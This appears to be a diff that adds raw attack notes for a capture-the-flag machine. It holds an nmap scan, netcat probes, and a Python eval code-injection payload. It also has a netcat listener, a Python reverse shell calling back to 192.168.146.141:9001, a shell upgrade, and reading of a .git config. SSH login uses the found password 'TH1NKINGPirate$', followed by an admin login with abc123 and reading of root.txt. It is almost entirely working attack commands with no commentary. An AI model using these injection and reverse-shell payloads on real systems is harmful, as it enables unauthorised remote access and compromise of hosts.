@@ -1,0 +1,36 @@
+nmap -sV -sC 10.82.139.178 
+
+nc -v 10.82.139.178 8000
+
+eval(compile("""__import__('os').popen(r'ping -c 4 192.168.146.141').read()""",'','single'))
+
+nc -lvnp 9001
+
+exec('import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.146.141",9001)); os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/sh")')
+
+$id
+ python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+pwd
+cd /home
+ls 
+ls /opt
+cd /opt/dev
+log
+ls -lhd /opt/dev
+ls -ld .git
+cd .git
+cat config
+
+netexec ssh 10.82.139.178 -u think -p 'TH1NKINGPirate$'
+ssh think@10.82.139.178
+cd user.txt
+
+nc -v 10.82.139.178 8000
+admin
+password: abc123
+
+shell
+id
+ls
+cat root.txt
